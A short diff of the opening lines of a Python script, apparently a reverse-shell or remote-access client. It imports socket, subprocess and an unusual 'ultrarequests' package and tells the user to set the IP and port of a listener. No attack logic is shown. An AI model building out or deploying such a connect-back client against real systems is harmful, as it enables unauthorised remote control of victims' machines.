@@ -1,5 +1,4 @@
 import struct,socket,subprocess,os,ultrarequests,platform,webbrowser as browser
-
 #   Change IP to your ip and Port to the listening port
 IP = "127.0.0.1" #Host
 port = 8080 #Port
